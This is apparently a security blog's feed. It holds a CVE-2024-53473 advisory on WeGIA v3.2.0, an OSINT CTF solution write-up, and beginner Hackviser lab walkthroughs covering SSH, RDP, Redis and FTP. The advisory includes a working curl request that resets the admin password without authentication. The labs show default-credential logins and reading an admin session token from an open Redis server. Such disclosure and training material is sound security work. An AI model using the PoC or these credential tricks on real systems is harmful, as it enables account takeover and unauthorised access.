            <description>CVE-2024-53473:Broken Access Control Vendor WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.
Affected Product Code Base WeGIA - v3.2.0
Vulnerability Description A critical vulnerability was identified in the web application WeGIa. This vulnerability allows an attacker to change the password of the admin user by sending a POST request to the control.php endpoint without requiring authentication or authorization.</description>
            <content type="html"><![CDATA[<h1 id="cve-2024-53473broken-access-control">CVE-2024-53473:Broken Access Control</h1>
<h2 id="vendor">Vendor</h2>
<p>WeGIA (Web Gerenciador Institucional) is an integrated management system licensed under the GNU GPL v3.0, designed to enhance administration, control, and transparency for institutions.</p>
<h3 id="affected-product-code-base">Affected Product Code Base</h3>
<p>WeGIA - v3.2.0</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>A critical vulnerability was identified in the web application WeGIa. This vulnerability allows an attacker to change the password of the admin user by sending a POST request to the control.php endpoint without requiring authentication or authorization.</p>
<h3 id="poc">POC</h3>
<p>Burp Request:</p>

    <img src="/images/CVE/cve2024-53473.png"  class="center"  style="border-radius: 10px;"  />


<p>Curl Request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">curl -X POST https://demo.wegia.org/controle/control.php \
  -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \
  -H &#34;Origin: https://demo.wegia.org&#34; \
  --data-raw &#34;nova_senha=1234567<span style="color:#960050;background-color:#1e0010">&amp;</span>confirmar_senha=1234567<span style="color:#960050;background-color:#1e0010">&amp;</span>nomeClasse=FuncionarioControle<span style="color:#960050;background-color:#1e0010">&amp;</span>metodo=alterarSenha<span style="color:#960050;background-color:#1e0010">&amp;</span>redir=logout.php<span style="color:#960050;background-color:#1e0010">&amp;</span>id_pessoa=1<span style="color:#960050;background-color:#1e0010">&amp;</span>alterar=Alterar&#34;

</code></pre></div><h2 id="reference">Reference</h2>
<p><a href="https://github.com/nilsonLazarin/WeGIA/issues/791" target="_blank" >https://github.com/nilsonLazarin/WeGIA/issues/791</a></p>
<p><a href="https://www.wegia.org/" target="_blank" >https://www.wegia.org</a></p>
<p><a href="https://github.com/nilsonmori/WeGIA" target="_blank" >https://github.com/nilsonmori/WeGIA</a></p>
<h2 id="discoverer">Discoverer</h2>
<blockquote>
<p><a href="https://nmmorette.github.io" target="_blank" >Natan Maia Morette</a> and <a href="https://www.linkedin.com/in/diegocbcastro/" target="_blank" >Diego Cardoso Borda Castro</a>, Nov 2024.</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>OSINT CTF - Menina Cyber Sec and Hack in Cariri</title>
            <link>https://nmmorette.github.io/posts/2024/08/osint-ctf-menina-cyber-sec-and-hack-in-cariri/</link>
            <pubDate>Sat, 10 Aug 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/08/osint-ctf-menina-cyber-sec-and-hack-in-cariri/</guid>
            <description>OSINT - CTF - MCS Solutions for the OSINT CTF challenges conducted by Menina de Cyber Sec and Hack in Cariri in August 2024.
The Trip of My Dreams https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio+1/OSINT-easy-01.jpeg
 The trip of my dreams
“The photos from the trip turned out amazing!” This is the photo of where we had a snack after a long walk through the city. The flag is the name of the establishment where the cat is coming out of.</description>
            <content type="html"><![CDATA[<h1 id="osint---ctf---mcs">OSINT - CTF - MCS</h1>
<p>Solutions for the OSINT CTF challenges conducted by Menina de Cyber Sec and Hack in Cariri in August 2024.</p>
<h1 id="the-trip-of-my-dreams">The Trip of My Dreams</h1>
<p><a href="https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio&#43;1/OSINT-easy-01.jpeg" target="_blank" >https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio+1/OSINT-easy-01.jpeg</a></p>
<blockquote>
<p>The trip of my dreams</p>
<p>“The photos from the trip turned out amazing!” This is the photo of where we had a snack after a long walk through the city. The flag is the name of the establishment where the cat is coming out of. Example: MCS{PLACE_OF_THE_PHOTO}</p>
<p>Points: 50</p>
</blockquote>
<p>The image below has the first clue for location, which is the Instagram of the place.

    <img src="/images/OSINT-CTF-MCS/image.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>After a quick search on Instagram and looking at the profile, you can find the full address and the name of the place <code>Cafe Paulette</code>.

    <img src="/images/OSINT-CTF-MCS/image%201.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h1 id="which-city">Which City</h1>
<blockquote>
<p>It&rsquo;s important to know a bit of history, sometimes to not repeat mistakes, sometimes to replicate successes. This city hosted a large part of Hacking history and is your first clue to finding the character at the center of this story. The flag will be the name of the person in the format FIRSTNAME_LASTNAME. Example: MCS{FIRSTNAME_LASTNAME}</p>
<p>Points: 300</p>
</blockquote>
<p><a href="https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio&#43;4/wherelegendborn.png" target="_blank" >https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio+4/wherelegendborn.png</a></p>
<p>Using Google Images, you can find the location of the photo and quickly search on Google to learn some hacking history. This leads to the name <code>Kevin Mitnick</code>.</p>

    <img src="/images/OSINT-CTF-MCS/image%202.png"  class="center"  style="border-radius: 10px;"  />


<h1 id="the-eiffel-tower-is-beautiful">The Eiffel Tower is Beautiful!</h1>
<blockquote>
<p>My trip to Paris was a bit strange. As a good hacker, I brought the flag as a souvenir from there. But you&rsquo;ll have to retrieve it yourself, take this photo as a clue. The flag should be submitted in the format MCS{YOUR_FLAG_HERE}</p>
<p>Points: 350</p>
</blockquote>

    <img src="/images/OSINT-CTF-MCS/image%203.png"  class="center"  style="border-radius: 10px;"  />


<p><a href="https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio&#43;5/morri.jpeg" target="_blank" >https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio+5/morri.jpeg</a></p>
<p>Analyzing the image metadata, you can find a username <code>@abellio356</code>.</p>

    <img src="/images/OSINT-CTF-MCS/image%204.png"  class="center"  style="border-radius: 10px;"  />


<p>After that, using tools to search for usernames like <code>Instant Username Search</code>, you can identify some possible profiles on networks.</p>

    <img src="/images/OSINT-CTF-MCS/image%205.png"  class="center"  style="border-radius: 10px;"  />


<p>On the profile of <code>X</code>, a message in Base64 stands out.</p>

    <img src="/images/OSINT-CTF-MCS/image%206.png"  class="center"  style="border-radius: 10px;"  />


<p>After decoding it, you can find the flag.</p>

    <img src="/images/OSINT-CTF-MCS/image%207.png"  class="center"  style="border-radius: 10px;"  />


<h1 id="what-game-was-that">What Game Was That?</h1>
<blockquote>
<p>Name of the stadium where the match was played? The flag would be the concatenation of the date and the stadium name. Example: MCS{DDMMYYYY_STADIUM}</p>
<p>Points: 150</p>
</blockquote>
<p><a href="https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio&#43;2/OSINT-easy-02.jpeg" target="_blank" >https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio+2/OSINT-easy-02.jpeg</a></p>

    <img src="/images/OSINT-CTF-MCS/image%208.png"  class="center"  style="border-radius: 10px;"  />


<p>To discover which game this was, you first had to identify the team names by their abbreviations <code>LIV</code> and <code>PEÑ</code> through a brief Google search.</p>
<p>Then, by analyzing matches between these two teams, it was possible to find the date of the match and the location.</p>

    <img src="/images/OSINT-CTF-MCS/image%209.png"  class="center"  style="border-radius: 10px;"  />


<h1 id="hack-in-cariri">Hack In Cariri</h1>
<blockquote>
<p>I know what Hack in Cariri did on January 19th, but do you? The flag must be submitted in the format MCS{YOUR_FLAG_HERE}</p>
<p>Score: 800</p>
</blockquote>
<p>This flag involved joining the WhatsApp community of the CTF. Upon analyzing the data, there was a possible hint.</p>

    <img src="/images/OSINT-CTF-MCS/image%2010.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/OSINT-CTF-MCS/image%2011.png"  class="center"  style="border-radius: 10px;"  />


<p>After that, it was just a matter of going to Instagram and searching for the post from that day to find the flag.</p>

    <img src="/images/OSINT-CTF-MCS/image%2012.png"  class="center"  style="border-radius: 10px;"  />


<h1 id="brazil-">Brazil 🇧🇷</h1>
<blockquote>
<p>Samuel recently visited some places in Brazil; he always leaves good reviews. The flag must be submitted in the format MCS{YOUR_FLAG_HERE}</p>
<p>Score: 200</p>
</blockquote>
<p><a href="https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio&#43;3/ponte.png" target="_blank" >https://hackincariri.s3.amazonaws.com/meninadecybersec/osint/desafio+3/ponte.png</a></p>
<p>Using Google image search, it was possible to find the exact image and the name of the location.</p>

    <img src="/images/OSINT-CTF-MCS/image%2013.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/OSINT-CTF-MCS/image%2014.png"  class="center"  style="border-radius: 10px;"  />


<p>Analyzing the comments on the location name, it was possible to find the flag.</p>

    <img src="/images/OSINT-CTF-MCS/image%2015.png"  class="center"  style="border-radius: 10px;"  />


<h1 id="menina-de-cybersec">Menina de Cybersec</h1>
<blockquote>
<p>And what has Menina de Cybersec been up to? Are you keeping up with our events? The flag must be submitted in the format MCS{YOUR_FLAG_HERE}</p>
<p>Score: 800</p>
</blockquote>
<p>This flag involved joining the CTF Discord server, where the flag could be found.</p>

    <img src="/images/OSINT-CTF-MCS/image%2016.png"  class="center"  style="border-radius: 10px;"  />


<p>All challenges completed:</p>

    <img src="/images/OSINT-CTF-MCS/image%2017.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/OSINT-CTF-MCS/image%2018.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hackerviser Secure Command - Warmup Stage I</title>
            <link>https://nmmorette.github.io/posts/2024/03/hackerviser-secure-command-warmup-stage-i/</link>
            <pubDate>Fri, 01 Mar 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/03/hackerviser-secure-command-warmup-stage-i/</guid>
            <description>Secure Command Introduction Secure Shell (SSH) is a protocol used to securely access and manage devices on a network. It encrypts data to protect confidentiality and integrity, making SSH a preferred option over Telnet for remote administration.
What is SSH? SSH is a cryptographic network protocol that facilitates secure communication over an unsecured network. Originally designed as a replacement for insecure protocols like Telnet, SSH ensures confidentiality and integrity of data exchanged between two networked devices.</description>
            <content type="html"><![CDATA[<h1 id="secure-command">Secure Command</h1>

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introduction"><strong>Introduction</strong></h2>
<p>Secure Shell (SSH) is a protocol used to securely access and manage devices on a network. It encrypts data to protect confidentiality and integrity, making SSH a preferred option over Telnet for remote administration.</p>
<h3 id="what-is-ssh">What is SSH?</h3>
<p>SSH is a cryptographic network protocol that facilitates secure communication over an unsecured network. Originally designed as a replacement for insecure protocols like Telnet, SSH ensures confidentiality and integrity of data exchanged between two networked devices. It provides a secure channel over an unsecured network by encrypting the data during transmission.</p>
<h3 id="key-features-and-benefits">Key Features and Benefits:</h3>
<ol>
<li><strong>Encryption</strong>: SSH employs strong encryption algorithms to secure communication, thwarting eavesdropping and data tampering attempts.</li>
<li><strong>Authentication</strong>: It supports various authentication methods, including passwords, public-key cryptography, and multi-factor authentication, ensuring robust access control.</li>
<li><strong>Port Forwarding</strong>: SSH&rsquo;s port forwarding capability allows users to securely tunnel traffic between local and remote systems, facilitating secure access to internal services.</li>
<li><strong>File Transfer</strong>: With tools like SCP (Secure Copy Protocol) and SFTP (SSH File Transfer Protocol), SSH enables secure file transfer between systems.</li>
<li><strong>Remote Administration</strong>: System administrators utilize SSH to manage servers and network devices remotely, executing commands and performing administrative tasks securely.</li>
<li><strong>Tunneling</strong>: SSH tunneling enables users to bypass network restrictions and securely access services hosted on remote networks.</li>
<li><strong>Automation</strong>: SSH can be seamlessly integrated into automated scripts and workflows, streamlining repetitive tasks and enhancing productivity.</li>
</ol>
<h3 id="the-future-of-ssh">The Future of SSH:</h3>
<p>Despite being over two decades old, SSH continues to evolve, adapting to the changing needs of modern computing environments. With the emergence of cloud computing and distributed systems, SSH remains indispensable for secure remote access and management.</p>
<p>Looking ahead, advancements in cryptography and networking technologies will likely further enhance SSH&rsquo;s security and performance, ensuring its relevance in the ever-evolving landscape of IT infrastructure.</p>
<h3 id="conclusion">Conclusion:</h3>
<p>SSH&rsquo;s enduring popularity is a testament to its reliability, security, and versatility. Whether you&rsquo;re a system administrator managing a fleet of servers or an individual user accessing your personal computer remotely, SSH empowers you with a secure and seamless remote access solution.</p>
<p>As we navigate the complexities of the digital age, SSH stands firm as a beacon of trust, enabling us to traverse the vast expanse of the internet securely and with confidence.</p>
<h2 id="tasks"><strong>Tasks</strong></h2>
<h3 id="which-ports-are-open">Which port(s) are open?</h3>
<p>Usually <code>ssh</code>runs in port 22, but  let&rsquo;s run <code>nmap</code> without a specific port.

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>Port 22 is open.</p>
<h3 id="what-is-the-running-service-name">What is the running service name?</h3>
<p>We got the service name with nmap

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-masters-message-when-connecting-to-ssh-with-hackviserhackviser-credentials">What is “Master&rsquo;s Message” when connecting to SSH with hackviser:hackviser credentials?</h3>
<p>Connection with <code>ssh</code>:

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-command-to-change-user-in-linux">What is the command to change user in Linux?</h3>
<p>The command to change the current user in Linux is <strong><code>su</code></strong>, which stands for &ldquo;switch user&rdquo; or &ldquo;substitute user&rdquo;. By default, when you run <strong><code>su</code></strong> without any arguments, it switches to the root user. If you want to switch to another user, you can specify the username as an argument.</p>
<h3 id="whats-the-password-for-root-user">What&rsquo;s the password for root user?</h3>
<p>Just tried to change to root with password root:

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-parameter-of-the-ls-command-that-shows-hidden-files">What is the parameter of the ls command that shows hidden files?</h3>
<p>The parameter of the <strong><code>ls</code></strong> command that shows hidden files is <strong><code>-a</code></strong> or <strong><code>--all</code></strong>. When you use <strong><code>ls -a</code></strong> or <strong><code>ls --all</code></strong>, it lists all files, including hidden files and directories. Hidden files and directories in Unix-like operating systems are those whose names start with a dot (.).</p>
<h3 id="what-is-the-masters-advice">What is the master&rsquo;s advice?</h3>
<p>Looking for files, I found the hidden file <code>.advice_of_the_master</code>in the root folder.

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />

</p>

    <img src="/images/hackerviser/Secure%20Command%20ec84e5c3b40a46d3ae24b4823e2bc7d0/Untitled0.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hackerviser 007 - Warmup Stage I</title>
            <link>https://nmmorette.github.io/posts/2024/02/hackerviser-007-warmup-stage-i/</link>
            <pubDate>Thu, 29 Feb 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/02/hackerviser-007-warmup-stage-i/</guid>
            <description>007 Introduction Remote Desktop Protocol (RDP) has become an indispensable tool in today&amp;rsquo;s digital landscape, enabling seamless remote access to computers and servers from anywhere in the world.
What is Remote Desktop Protocol (RDP)? Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, designed to facilitate remote desktop connections between computers over a network connection. It allows users to access and control a remote computer as if they were physically present at the machine.</description>
            <content type="html"><![CDATA[<h1 id="007">007</h1>

    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introduction"><strong>Introduction</strong></h2>
<p>Remote Desktop Protocol (RDP) has become an indispensable tool in today&rsquo;s digital landscape, enabling seamless remote access to computers and servers from anywhere in the world.</p>
<h3 id="what-is-remote-desktop-protocol-rdp">What is Remote Desktop Protocol (RDP)?</h3>
<p>Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, designed to facilitate remote desktop connections between computers over a network connection. It allows users to access and control a remote computer as if they were physically present at the machine. RDP operates on TCP/IP and is available on most versions of Windows operating systems.</p>
<h3 id="benefits-of-rdp">Benefits of RDP</h3>
<ol>
<li><strong>Remote Access</strong>: RDP enables users to remotely access their desktops, laptops, or servers from anywhere with an internet connection, providing flexibility and convenience for remote work scenarios.</li>
<li><strong>Collaboration</strong>: RDP allows multiple users to connect to a single computer simultaneously, fostering collaboration and teamwork, especially in remote or distributed teams.</li>
<li><strong>Resource Sharing</strong>: RDP enables the sharing of resources and applications across multiple devices, optimizing resource utilization and enhancing productivity.</li>
<li><strong>Security</strong>: RDP incorporates robust encryption and authentication mechanisms to ensure secure remote connections, protecting sensitive data from unauthorized access.</li>
</ol>
<h3 id="best-practices-for-using-rdp">Best Practices for Using RDP</h3>
<ol>
<li><strong>Enable Network-Level Authentication (NLA)</strong>: NLA enhances security by requiring users to authenticate before establishing a remote desktop session, mitigating the risk of unauthorized access.</li>
<li><strong>Use Strong Passwords</strong>: Ensure that strong, unique passwords are set for RDP connections to prevent brute-force attacks and unauthorized access to remote systems.</li>
<li><strong>Implement Firewall Rules</strong>: Configure firewall rules to restrict RDP access to trusted IP addresses or networks, reducing the risk of unauthorized access from external sources.</li>
<li><strong>Keep Software Updated</strong>: Regularly update RDP client and server software to patch security vulnerabilities and ensure the latest features and enhancements are available.</li>
</ol>
<h3 id="conclusion">Conclusion</h3>
<p>Remote Desktop Protocol (RDP) revolutionizes the way we access and manage remote systems, offering unparalleled convenience, flexibility, and security. Whether you&rsquo;re a remote worker, IT administrator, or business owner, leveraging RDP can streamline operations, enhance collaboration, and drive productivity. By following best practices and deploying RDP securely, you can unlock the full potential of remote access technology and empower your workforce to thrive in today&rsquo;s interconnected world.</p>
<h2 id="tasks"><strong>Tasks</strong></h2>
<h3 id="what-is-target-hostname">What is target hostname?</h3>
<p>Usually RDP is on port 3389, you could run <code>nmap</code>directly to this port, but Let <code>nmap</code> with <code>-A</code>to get info about the service.

    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-does-rdp-stands-for">What does RDP stands for?</h3>
<p>Remote Desktop Protocol</p>
<h3 id="what-is-usually-the-most-privileged-username-in-windows">What is usually the most privileged username in Windows?</h3>
<p>In Windows systems, the most privileged username is typically &ldquo;Administrator.&rdquo; This account has full access to system resources, including the ability to install software, modify system settings, and perform administrative tasks. It is important to safeguard the Administrator account with a strong password and limit its usage to necessary administrative tasks to ensure the security of the system. Additionally, it&rsquo;s recommended to create a separate, less privileged user account for everyday tasks to minimize the risk of accidental or malicious actions.</p>
<h3 id="whats-the-windows-version">Whats the Windows version?</h3>
<p>Let&rsquo;s attempt to establish an RDP connection to the target machine using the guessed Administrator user credentials.</p>
<p>Various tools exist for setting up an RDP connection to a remote computer. Microsoft Remote Desktop, FreeRDP, rdesktop, and Remmina are among the options available for RDP connections.</p>
<p>For the task at hand, let&rsquo;s utilize xfreerdp , usually pre-installed in Kali Linux. Since we dont have a password, lets try to connect with administrator and no password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xfreerdp /u:administrator /v:172.20.4.55  

</code></pre></div>
    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


<p>With the RDP connection open, lets use the command <code>winver</code>to check the windows version.

    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />

</p>
<p>It is also possible to get this info in <code>Powershell</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-ComputerInfo | Select-Object WindowsVersion
</code></pre></div><h3 id="what-is-the-name-of-the-suspect-folder-under-the-c-directory">What is the name of the suspect folder under the C:\ directory?</h3>
<p>Checking the <code>C:\</code> directory, there is a non common/default windows folder:

    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="which-user-owns-the-junk-folder">Which user owns the junk folder?</h3>
<p>It is possible to check a owners folder in Properties&gt;Security&gt;Advanced:

    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />

</p>

    <img src="/images/hackerviser/007%206e77e78d74f24abca6dc9f02881349d1/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hackerviser Reddict - Warmup Stage I</title>
            <link>https://nmmorette.github.io/posts/2024/02/hackerviser-reddict-warmup-stage-i/</link>
            <pubDate>Wed, 28 Feb 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/02/hackerviser-reddict-warmup-stage-i/</guid>
            <description>Reddict Introduction Redis, short for Remote Dictionary Server, has emerged as a cornerstone in modern software development, revolutionizing how data is stored, cached, and processed. In this comprehensive guide, we will delve into the depths of Redis, exploring its features, use cases, and best practices. Whether you&amp;rsquo;re a seasoned developer seeking to optimize performance or a newcomer intrigued by the buzz surrounding Redis, this blog post aims to provide you with a thorough understanding of its capabilities and potential applications.</description>
            <content type="html"><![CDATA[<h1 id="reddict">Reddict</h1>

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled00.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introduction"><strong>Introduction</strong></h2>
<p>Redis, short for Remote Dictionary Server, has emerged as a cornerstone in modern software development, revolutionizing how data is stored, cached, and processed. In this comprehensive guide, we will delve into the depths of Redis, exploring its features, use cases, and best practices. Whether you&rsquo;re a seasoned developer seeking to optimize performance or a newcomer intrigued by the buzz surrounding Redis, this blog post aims to provide you with a thorough understanding of its capabilities and potential applications.</p>
<h3 id="understanding-redis">Understanding Redis</h3>
<p>At its core, Redis is an in-memory data structure store, acting as a key-value database, cache, and message broker. Unlike traditional databases, Redis stores data primarily in RAM, enabling lightning-fast read and write operations. Its data model supports various data types, including strings, hashes, lists, sets, and sorted sets, allowing for versatile data manipulation.</p>
<h2 id="tasks"><strong>Tasks</strong></h2>
<h3 id="which-ports-are-open">Which port(s) are open?</h3>
<p>Running <code>nmap</code>against the target ip</p>

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled1.png"  class="center"  style="border-radius: 10px;"  />


<p>This first scan didin’t found any open ports, then running <code>nmap</code>again with the parameter <code>-p-</code>to scan all ports, it found the port <code>6379</code>.

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-version-number-of-the-running-redis-service">What is the version number of the running Redis service?</h3>
<p>Using <code>nmap</code>again with the <code>-A</code> to get more info about the service:

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="what-is-the-command-line-utility-lets-you-interact-with-a-redis-database">What is the command-line utility lets you interact with a Redis database?</h3>
<p>The command-line utility that allows you to interact with a Redis database is called <code>redis-cli.</code>This tool provides a command-line interface for executing Redis commands, querying data, and managing the Redis server. With <code>redis-cli</code>, you can perform various operations such as setting and retrieving keys, running Redis commands, monitoring server performance, and more, all directly from the command line.</p>
<h3 id="what-is-the-response-when-the-ping-command-is-run-after-a-successful-connection-is-established">What is the response when the PING command is run after a successful connection is established?</h3>

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="what-command-returns-information-and-statistics-about-the-server">What command returns information and statistics about the server?</h3>
<p>The <strong><code>INFO</code></strong> command is used to return information and statistics about the Redis server. When you run the <strong><code>INFO</code></strong> command in the <strong><code>redis-cli</code></strong> interface, it provides a detailed output containing various metrics such as memory usage, client connections, commands processed, and more. This information is valuable for monitoring the health and performance of the Redis server.

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h3 id="which-command-returns-all-keys">Which command returns all keys?</h3>
<p>The command used to retrieve all keys stored in a Redis database is <strong><code>KEYS *</code></strong>. When you run this command in the <strong><code>redis-cli</code></strong> interface, it returns a list of all keys present in the database.</p>
<h3 id="how-many-key-value-pairs-are-there">How many key-value pairs are there?</h3>

    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="which-command-retrieves-the-value-of-the-key">Which command retrieves the value of the key?</h3>
<p>The command used to retrieve the value associated with a specific key in a Redis database is <strong><code>GET</code></strong>. You would use it like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">
<span style="color:#66d9ef">GET</span> your_key_here

</code></pre></div><h3 id="what-is-admins-sessiontoken-value">What is admin&rsquo;s sessionToken value?</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET session:admin-001
</code></pre></div><p>
    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/hackerviser/Reddict%20bd4eff79231a405e95112ae5c139f3a6/Untitled%208.png"  class="center"  style="border-radius: 10px;"  />

</p>
]]></content>
        </item>
        
        <item>
            <title>Hackerviser File Hunter - Warmup Stage I</title>
            <link>https://nmmorette.github.io/posts/2024/02/hackerviser-file-hunter-warmup-stage-i/</link>
            <pubDate>Tue, 27 Feb 2024 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2024/02/hackerviser-file-hunter-warmup-stage-i/</guid>
            <description>File Hunter Introduction File Transfer Protocol (FTP) is a standard network protocol used for transferring files between a client and a server on a computer network. Since its inception in the early days of the internet, FTP has remained a popular choice for facilitating file transfers, despite the emergence of more secure alternatives. In this blog post, we will delve into the fundamentals of FTP, its operation, security considerations, and alternatives available in today&amp;rsquo;s technology landscape.</description>
            <content type="html"><![CDATA[<h1 id="file-hunter">File Hunter</h1>

    <img src="/images/hackerviser/File%20Hunter%2009e09ac895ae4346a26594893322b46f/Untitled0.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introduction"><strong>Introduction</strong></h2>
<p>File Transfer Protocol (FTP) is a standard network protocol used for transferring files between a client and a server on a computer network. Since its inception in the early days of the internet, FTP has remained a popular choice for facilitating file transfers, despite the emergence of more secure alternatives. In this blog post, we will delve into the fundamentals of FTP, its operation, security considerations, and alternatives available in today&rsquo;s technology landscape.</p>
<h3 id="what-is-ftp">What is FTP?</h3>
<p>FTP operates on the Application Layer of the OSI model and uses a client-server architecture. It enables users to transfer files over a TCP/IP network, allowing for the upload, download, and management of files between a client machine and a remote server.</p>
<p>How Does FTP Work?
FTP functions through a control connection and a separate data connection. The control connection is established on port 21 and handles commands and responses between the client and server, such as authentication, file manipulation, and directory navigation. The data connection, established on port 20 for active mode or dynamically assigned ports for passive mode, is used for transferring the actual file data.</p>
<h3 id="types-of-ftp-connections">Types of FTP Connections</h3>
<ol>
<li>Active Mode: In active mode FTP, the client initiates a connection to the server&rsquo;s port 21 for control commands and to the server&rsquo;s port 20 for data transfer. This mode may encounter issues with firewalls and NAT configurations.</li>
<li>Passive Mode: Passive mode FTP involves the client initiating both the control and data connections to the server. The server listens on a port range configured for passive mode data transfers, allowing it to bypass firewall restrictions and NAT traversal issues.</li>
</ol>
<h3 id="security-considerations">Security Considerations</h3>
<ol>
<li>Plain Text Authentication: Traditional FTP transmits usernames, passwords, and data in plain text, making it susceptible to eavesdropping and interception by malicious actors.</li>
<li>FTPS (FTP Secure): FTPS adds a layer of security to FTP by encrypting the control and data connections using SSL/TLS protocols. It provides authentication and data integrity, addressing the security concerns of plain text FTP.</li>
<li>SFTP (SSH File Transfer Protocol): SFTP is a separate protocol from FTP, utilizing SSH to secure file transfers with encryption and authentication mechanisms.</li>
</ol>
<h3 id="alternatives-to-ftp">Alternatives to FTP</h3>
<ol>
<li>SFTP (SSH File Transfer Protocol): SFTP provides secure file transfer capabilities over an encrypted SSH connection, offering stronger security than traditional FTP.</li>
<li>SCP (Secure Copy Protocol): SCP allows for secure file transfers between hosts using the SSH protocol, offering simplicity and security.</li>
<li>HTTPS: HTTPS enables secure file transfers over HTTP using SSL/TLS encryption, making it suitable for web-based file sharing and distribution.</li>
</ol>
<h3 id="conclusion">Conclusion</h3>
